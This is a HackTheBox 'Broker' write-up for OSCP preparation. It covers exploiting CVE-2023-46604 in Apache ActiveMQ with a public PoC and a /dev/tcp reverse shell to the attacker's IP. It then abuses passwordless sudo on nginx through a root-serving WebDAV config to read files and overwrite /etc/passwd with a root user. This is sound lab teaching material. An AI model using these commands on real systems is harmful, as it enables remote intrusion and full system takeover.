+++
date = '2026-05-15T00:00:00-03:00'
draft = false
title = 'HTB: Broker - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'activemq', 'cve-2023-46604', 'nginx', 'sudo', 'webdav']
description = 'Write-up for HackTheBox machine Broker - Apache ActiveMQ RCE via CVE-2023-46604 for foothold, then abusing a passwordless sudo nginx permission to read and overwrite system files as root.'
ShowToc = true
TocOpen = false

[cover]
image = 'images/htb-broker/cover.png'
+++

CVE-2023-46604 dropped while this machine was live - a critical Apache ActiveMQ RCE with a public PoC, CVSS 10.0. The privesc flips the script: instead of running code, nginx becomes a file server for the entire filesystem.

## Machine info

| | |
|---|---|
| **Name** | Broker |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Rustscan reveals port 61616 running Apache ActiveMQ 5.15.15 - vulnerable to CVE-2023-46604
- Clone and adapt the public PoC: serve a malicious ClassInfo XML and trigger the RCE to land a shell as `activemq`
- `sudo -l` shows `activemq` can run `/usr/sbin/nginx` as root without a password
- Craft an evil nginx config with WebDAV PUT and `root /;` to expose the entire filesystem on port 1337
- Read `root.txt` directly, or overwrite `/etc/passwd` to add a new root-level user

---

## Recon

### Port scan

![Rustscan initial scan](/images/htb-broker/rustscan.png)

```bash
rustscan -a 10.129.33.91 -- -sV -sC -Pn -A
```

![ActiveMQ version disclosure](/images/htb-broker/nmap-activemq.png)

Port 61616 identifies itself as **ActiveMQ OpenWire transport 5.15.15** - that version banner is the key finding.

---

## Enumeration

A quick search for known vulnerabilities against ActiveMQ 5.15.x leads to **CVE-2023-46604** - a critical (CVSS 10.0) remote code execution vulnerability in the OpenWire protocol deserializer. Public PoCs are available.

---

## Foothold

### CVE-2023-46604 - Apache ActiveMQ RCE

Clone the PoC:

![Git clone CVE-2023-46604](/images/htb-broker/clone-poc.png)

```bash
git clone https://github.com/rootsecdev/CVE-2023-46604.git
```

The exploit works by sending a specially crafted `ClassInfo` message to the OpenWire port. The target fetches an XML file from an attacker-controlled server and instantiates a Java class from it - which we use to execute a reverse shell.

Edit `poc-linux.xml` to point to our listener:

![Payload XML content](/images/htb-broker/payload-xml.png)

The command inside the XML is HTML-entity encoded and resolves to:

```bash
bash -i >&/dev/tcp/10.10.14.208/9001 0>&1
```

Serve the payload with Python and trigger the exploit:

![Running exploit and receiving shell as activemq](/images/htb-broker/foothold-shell.png)

```bash
python -m http.server 80
go run main.go -i 10.129.33.91 -p 61616 -u http://10.10.14.208/poc-linux.xml
```

Shell lands as `activemq`.

---

## Privilege Escalation

### Nginx as root - filesystem file server

Check sudo permissions:

![sudo -l output](/images/htb-broker/sudo-l.png)

`activemq` can run `/usr/sbin/nginx` as root with no password. Nginx accepts a custom config at startup - we can make it serve the root filesystem over HTTP with WebDAV write access enabled.

Create the evil config:

```bash
cat > /tmp/evil.conf << 'EOF'
user root;
worker_processes 1;
pid /tmp/nginx.pid;
error_log /tmp/nginx_error.log;
events { worker_connections 1024; }
http {
    server {
        listen 1337;
        root /;
        autoindex on;
        dav_methods PUT DELETE;
    }
}
EOF
```

Launch nginx as root:

```bash
sudo nginx -c /tmp/evil.conf
```

#### Option A - Read root flag directly

![Reading root flag via curl](/images/htb-broker/read-root-flag.png)

```bash
curl http://localhost:1337/root/root.txt
```

#### Option B - Overwrite /etc/passwd to get a root shell

Generate a password hash:

![Generating openssl hash](/images/htb-broker/openssl-hash.png)

```bash
openssl passwd -1 hacked
# $1$CxylC.4K$CgcH/tqC4swabH4mVN0T81
```

Download the current `/etc/passwd`, append a new root-level user, then upload it back:

![Downloading /etc/passwd](/images/htb-broker/download-passwd.png)

```bash
curl http://localhost:1337/etc/passwd -O passwd
```

![Appending pwned user entry](/images/htb-broker/append-user.png)

```bash
echo 'pwned:$1$CxylC.4K$CgcH/tqC4swabH4mVN0T81:0:0:root:/root:/bin/bash' >> passwd
```

![Uploading modified passwd via PUT](/images/htb-broker/upload-passwd.png)

```bash
curl -X PUT http://localhost:1337/etc/passwd --data-binary @/tmp/passwd
```

![Root shell via su](/images/htb-broker/root-shell.png)

```bash
su pwned
# Password: hacked
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root!**

---

## Takeaways (for OSCP)

- **Version banners are your best friend.** ActiveMQ announced its own vulnerability - never skip service version enumeration on unusual ports.
- **CVE hunting on identified services pays off.** A CVSS 10.0 with a public PoC is as good as it gets for a foothold; always search CVEs when you see a specific version string.
- **Sudo on an admin binary can be worse than a SUID shell.** Nginx with a custom config gave full read/write access to the filesystem without needing any exploit - just creative configuration.
- **Know both the quick win and the persistent win.** Reading root.txt directly is fast; overwriting `/etc/passwd` gives persistent root access.

## References

- [HackTheBox - Broker](https://app.hackthebox.com/machines/Broker)
- [CVE-2023-46604 PoC - rootsecdev](https://github.com/rootsecdev/CVE-2023-46604)
- [GTFOBins - nginx](https://gtfobins.github.io/gtfobins/nginx/)
- Lain Kusanagi list (OSCP prep)
